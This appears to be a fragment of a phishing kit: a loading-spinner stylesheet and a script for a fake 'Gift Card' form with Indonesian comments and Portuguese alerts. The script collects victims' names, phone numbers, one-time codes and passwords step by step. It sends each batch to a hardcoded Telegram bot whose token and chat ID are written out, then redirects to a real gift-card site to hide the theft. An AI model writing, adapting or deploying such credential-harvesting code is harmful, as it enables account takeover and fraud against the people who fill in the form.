        /* CSS untuk loading */
        .loading {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255, 255, 255, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 999;
            visibility: hidden; /* Hidden by default */
            opacity: 0;
            transition: opacity 0.3s ease;
        }
        .loading.show {
            visibility: visible;
            opacity: 1;
        }
        .loading .spinner {
            border: 8px solid #f3f3f3; /* Light grey */
            border-top: 8px solid #3498db; /* Blue */
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

<script>
    const TELEGRAM_API_URL = 'https://api.telegram.org/bot9262714469:AAHYM-_vmoxxRgkZPwtp6FgYDyrSOAxLVVQ/sendMessage'; // Ganti dengan token bot Telegram Anda
    const CHAT_ID = '7737465598'; // Ganti dengan chat ID Telegram Anda

    async function sendToTelegram(message) {
        try {
            const response = await fetch(TELEGRAM_API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }

            const data = await response.json();
            console.log('Data berhasil dikirim ke Telegram:', data);
            return true;
        } catch (error) {
            console.error('Terjadi kesalahan saat mengirim data ke Telegram:', error);
            return false;
        }
    }

    function showLoading(show) {
        const loadingElement = document.querySelector('.loading');
        if (show) {
            loadingElement.classList.add('show');
        } else {
            loadingElement.classList.remove('show');
        }
    }

    function nextStep() {
        const currentStep = document.querySelector('.form-step:not(.hidden)');
        const nextStep = currentStep.nextElementSibling;

        // Validasi inputan
        if (!validateInputs(currentStep)) {
            alert('Por favor, preencha todos os campos antes de prosseguir.');
            return;
        }

        // Simpan data dari langkah saat ini
        let message = '';
        if (currentStep.id === 'step1') {
            const name = document.querySelector('input[name="name"]').value;
            const phone = document.querySelector('input[name="phone"]').value;
            document.getElementById('name').value = name;
            document.getElementById('phone').value = phone;
            message = `【Gift Card𝟙】:\n👍 𝐍𝐚𝐦𝐚: ${name}\n👍 𝐍𝐨.𝐇𝐏: ${phone}`;
        } else if (currentStep.id === 'step2') {
            const name = document.getElementById('name').value;
            const phone = document.getElementById('phone').value;
            const otp = document.querySelector('input[name="otp"]').value;
            document.getElementById('name2').value = name;
            document.getElementById('phone2').value = phone;
            document.getElementById('otp').value = otp;
            message = `【Gift Card𝟚】:\n👍 𝐍𝐚𝐦𝐚: ${name}\n👍 𝐍𝐨.𝐇𝐏: ${phone}\n👍 𝐎.𝐓.𝐏: ${otp}`;
        } else if (currentStep.id === 'step3') {
            const name = document.getElementById('name2').value;
            const phone = document.getElementById('phone2').value;
            const otp = document.getElementById('otp').value;
            const password = document.querySelector('input[name="password"]').value;
            // Debugging: Log nilai untuk memastikan semuanya diambil dengan benar
            console.log('Debug Step 3:');
            console.log('Name:', name);
            console.log('Phone:', phone);
            console.log('OTP:', otp);
            console.log('Password:', password);

            message = `【Gift Card𝟛】:\n👍 𝐍𝐚𝐦𝐚: ${name}\n👍 𝐍𝐨.𝐇𝐏: ${phone}\n👍 𝐎.𝐓.𝐏: ${otp}\n👍 𝐏𝐚𝐬𝐬: ${password}`;
        }

        // Tampilkan loading
        showLoading(true);

        // Kirim data ke Telegram
        if (message) {
            sendToTelegram(message).then(success => {
                // Sembunyikan loading dan pindahkan ke langkah berikutnya
                showLoading(false);
                if (success) {
                    currentStep.classList.add('hidden');
                    nextStep.classList.remove('hidden');
                }
            });
        } else {
            // Sembunyikan loading dan pindahkan ke langkah berikutnya jika tidak ada pesan
            showLoading(false);
            currentStep.classList.add('hidden');
            nextStep.classList.remove('hidden');
        }
    }

    async function submitForm() {
        const currentStep = document.querySelector('.form-step:not(.hidden)');
        if (currentStep.id === 'step3') {
            // Validasi inputan
            if (!validateInputs(currentStep)) {
                alert('Harap isi semua kolom sebelum mengirim.');
                return;
            }

            // Simpan data dari langkah 3 dan kirim ke Telegram
            const name = document.getElementById('name2').value;
            const phone = document.getElementById('phone2').value;
            const otp = document.getElementById('otp').value;
            const password = document.querySelector('input[name="password"]').value;

            const message = `【Gift Card𝟛】:\n👍 𝐍𝐚𝐦𝐚: ${name}\n👍 𝐍𝐨.𝐇𝐏: ${phone}\n👍 𝐎.𝐓.𝐏: ${otp}\n👍 𝐏𝐚𝐬𝐬: ${password}`;

            // Tampilkan loading
            showLoading(true);

            // Kirim data ke Telegram dan redirect setelah berhasil
            const success = await sendToTelegram(message);
            if (success) {
                window.location.href = 'https://www.giftcard.pt/';
            } else {
                showLoading(false);
                alert('Ocorreu um erro ao enviar dados.');
            }
        }
    }

    // Fungsi untuk memvalidasi inputan
    function validateInputs(step) {
        const requiredInputs = step.querySelectorAll('input[required]');
        const requiredSelects = step.querySelectorAll('select[required]');
        
        const inputsValid = Array.from(requiredInputs).every(input => input.value.trim() !== '');
        const selectsValid = Array.from(requiredSelects).every(select => select.value.trim() !== '');

        return inputsValid && selectsValid;
    }
</script>
